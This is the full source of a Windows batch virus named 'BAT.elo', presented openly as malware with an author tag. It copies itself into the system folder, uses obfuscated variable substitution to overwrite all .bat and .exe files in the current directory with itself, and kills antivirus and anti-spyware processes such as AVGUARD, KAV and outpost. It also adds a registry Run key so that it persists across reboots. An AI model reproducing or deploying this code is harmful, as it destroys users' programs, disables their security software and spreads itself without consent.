   :: BAT.elo
   :: by eml

   copy %0 %systemroot%\elo.bat > nul
   set set = 86
   %86% for = 3
   %86% do copy = 1
   %86% *.bat = 6
   %3% %%b in (%6%) %1% %0 %%b
   set set = 10
   %10% for = 4
   %10% do copy = 1
   %10% *.exe = 4
   %4% %%e in (%4%) %1% %0 %%e
   cls
   tskill AVGUARD
   tskill AVGNT
   tskill NMAIN
   tskill KAV
   tskill ad-aware
   tskill av*
   tskill NISSERV
   tskill outpost
   tskill KAVPF
   reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v elo /t REG_SZ /d %systemroot%\elo.bat /f > nul
